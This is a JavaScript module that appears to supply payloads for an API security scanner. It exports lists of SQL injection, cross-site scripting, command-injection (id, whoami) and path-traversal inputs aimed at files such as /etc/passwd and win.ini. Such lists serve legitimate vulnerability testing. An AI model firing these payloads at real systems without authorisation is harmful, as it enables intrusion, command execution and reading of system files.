// GreenAPI/payloads.js (Self-Contained & Comprehensive)

const payloads = {
    // --- SQL Injection ---
    sqlInjection: [
        "'",
        "''",
        "`",
        "``",
        ",",
        "\"",
        "\"\"",
        "/",
        "//",
        "\\",
        "\\\\",
        ";",
        "' OR 1=1--",
        "\" OR 1=1--",
        "OR 1=1--",
        "' OR '1'='1",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "' UNION SELECT 1,2,3--",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 'x'='x",
        "' AND id IS NULL; --",
        "SLEEP(5)#",
    ],
    
    // --- Cross-Site Scripting (XSS) ---
    xss: [
        "<script>alert('XSS')</script>",
        "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
        "'\"><script>alert(1)</script>",
        "<IMG SRC=jAvascript:alert('XSS')>",
        "<IMG SRC=\"javascript:alert('XSS');\">",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=\"#\" onmouseover=\"alert('xxs')\">",
        "<IMG SRC=\"#\" onerror=\"alert('xxs')\">",
        "<body onload=alert('XSS')>",
        "'" , "\"", ">" , "<",
    ],

    // --- Command Injection ---
    commandInjection: [
        "|id",
        ";id",
        "& id",
        "&& id",
        "$(id)",
        "`id`",
        "|| id",
        "| whoami",
        "; whoami",
        "&& whoami",
    ],

    // --- Path Traversal ---
    pathTraversal: [
        "../",
        "../../",
        "../../../",
        "../../../../",
        "../../../../../",
        "..%2f",
        "..%2f..%2f",
        "%2e%2e%2f",
        "%2e%2e%2f%2e%2e%2f",
        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
    ],
};

module.exports = payloads;